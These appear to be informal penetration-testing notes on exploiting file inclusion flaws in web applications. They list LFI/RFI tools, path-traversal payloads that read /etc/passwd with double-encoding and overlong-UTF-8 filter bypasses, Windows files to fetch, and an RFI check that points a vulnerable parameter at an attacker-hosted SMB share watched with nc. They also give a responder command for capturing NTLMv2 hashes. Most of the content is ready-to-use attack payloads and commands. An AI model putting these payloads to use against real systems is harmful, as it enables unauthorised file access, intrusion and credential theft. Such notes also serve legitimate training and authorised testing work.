lfisuite tool from github 
A interesting tool to exploit this vulnerability: https://github.com/kurobeats/fimap    
 
If LFI found on system try to fetch common windows file like
/windows/system32/license.rtf
/windows/pather/unattend.xml

2. In case if you are not getting anything sensitive information or not able to exploit it,
go for RFI by hosting a local SMB server and confirm it by running nc on 445 eg.
http://example.php?file=\\10.10.14.111\htb\file.txt
nc -lvnp 445
If receive hits on nc it means it is vulnerable to RFI.

3. Also run responder and try to get a NTLMv2 hash
responder -I eth0

4. Use tcpdump to verify
tcpdump -i eth0 port 445    
    
    
Local File Inclusion 

http://example.com/index.php?page=index.php         asia file chiye parameter value me to hi lfi hoga

http://example.com/index.php?page=../../../etc/passwd

file, document, folder, root, path, pg, style, pdf, template, php_path, doc
dest, redirect, uri, path, continue, url, window, next, data, reference, site, html, val, validate, domain,

4) lfi - /var/www/html/ & /etc/passwd
../../etc/passwd
  
 

use  Encoding        #for encoding double encoding  check mastering morden web penetest
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
